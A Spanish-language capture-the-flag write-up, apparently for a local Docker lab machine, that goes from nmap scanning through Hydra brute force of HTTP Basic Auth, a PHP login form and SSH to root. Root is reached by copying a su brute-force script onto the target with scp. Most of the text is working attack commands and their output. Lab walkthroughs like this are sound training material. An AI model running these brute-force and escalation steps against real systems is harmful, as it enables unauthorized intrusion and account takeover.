
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p22,80 --min-rate 5000 172.17.0.2 -oG vers
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Apache 2.4.62 — 401 Unauthorized |

---

## 2. HTTP Basic Auth — primera capa

Al acceder a `http://172.17.0.2` el servidor responde directamente con un 401 y solicita HTTP Basic Auth. Se usa Hydra con una lista de credenciales por defecto:

```bash
hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  http-get://172.17.0.2
```

Credenciales encontradas:

```
httpadmin : fhttpadmin
```

---

## 3. Enumeración web con Basic Auth

Con las credenciales de Basic Auth generamos el header en base64:

```bash
echo -n "httpadmin:fhttpadmin" | base64
# aHR0cGFkbWluOmZodHRwYWRtaW4=
```

Enumeramos directorios pasando el header en cada petición:

```bash
gobuster dir -u http://172.17.0.2 \
  -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,db,zip,bak \
  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
```

Resultados relevantes:

```
/login.php     [Status: 200]
/database.db   [Status: 200]
```

---

## 4. Formulario de login — segunda capa

`/login.php` expone un formulario adicional. Se lanza fuerza bruta pasando el header de Basic Auth en cada intento:

```bash
hydra -l admin -P /opt/rockyou.txt 172.17.0.2 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=incorrectas"
```

Credenciales encontradas:

```
admin : chocolate
```

El panel tras el login muestra:

```
¡Login correcto! Enhorabuena! De parte del usuario balutin, te damos la enhorabuena
```

El nombre de usuario `balutin` queda expuesto directamente en el mensaje de bienvenida.

---

## 5. Acceso SSH como balutin

Con el usuario identificado, se lanza fuerza bruta SSH:

```bash
hydra -l balutin -P /opt/rockyou.txt ssh://172.17.0.2 -t 64
```

Credencial encontrada:

```
balutin : estrella
```

```bash
ssh balutin@172.17.0.2
balutin@5dd6ca4dd992:~$ whoami
balutin
```

---

## 6. Enumeración interna

```bash
sudo -l        # sudo no disponible
find / -perm -4000 2>/dev/null   # Solo binarios estándar del sistema
getcap -r / 2>/dev/null          # Sin capabilities
cat /etc/passwd                  # Solo balutin y root con shell
ls /home/                        # Solo /home/balutin
```

Sin vectores de escalada directos. Es el único usuario del sistema.

---

## 7. Escalada a root — fuerza bruta de su con Linux-Su-Force

Sin rutas de escalada convencionales, se recurre a fuerza bruta del comando `su` con el script [Linux-Su-Force](https://github.com/Maalfer/Sudo_BruteForce), que la máquina víctima no tiene `curl` ni `wget` accesibles, así que se transfiere via SCP desde el atacante:

```bash
# En el atacante
curl https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh \
  -o bruteforce.sh

scp bruteforce.sh balutin@172.17.0.2:/tmp/
scp /opt/rockyou.txt balutin@172.17.0.2:/tmp/
```

Desde la sesión SSH:

```bash
chmod +x /tmp/bruteforce.sh
/tmp/bruteforce.sh root /tmp/rockyou.txt
```

```
Contraseña encontrada para el usuario root: rockyou
```

La contraseña de root es literalmente `rockyou` — el nombre de la wordlist utilizada.

```bash
su root
# contraseña: rockyou

root@5dd6ca4dd992:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@5dd6ca4dd992:/tmp# whoami
root
```
